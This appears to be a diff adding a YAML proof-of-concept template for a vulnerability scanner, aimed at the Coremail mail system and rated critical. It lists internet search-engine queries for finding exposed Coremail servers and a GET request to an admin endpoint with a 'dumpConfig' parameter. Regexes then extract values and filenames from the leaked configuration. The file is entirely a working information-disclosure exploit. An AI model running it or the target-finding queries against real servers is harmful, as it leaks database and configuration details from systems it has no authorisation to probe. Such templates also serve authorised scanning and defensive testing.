@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Coremail-邮件系统" && icon_hash="541942600"
+    hunter-query: app.name=="Coremail Web Console"
+    quake-query: app:"Coremail论客邮件系统"
+    zoomeye-query: icon
+    threatbook-query: icon
+    cve: 
+    cnvd: 
+
+name: poc-yaml-coremail-database-unleak
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+    expression: >-
+      response.body_string.contains("User") && response.body_string.contains("Database")
+
+    output:
+      search: |-
+        "(?P<data>2[\\d]{7})".bsubmatch(response.body)
+      data: search["data"]
+      search1: |-
+        "(?P<filename>UNIS.*?txt)".bsubmatch(response.body)
+      filename: search1["filename"]
+expression: r0() 
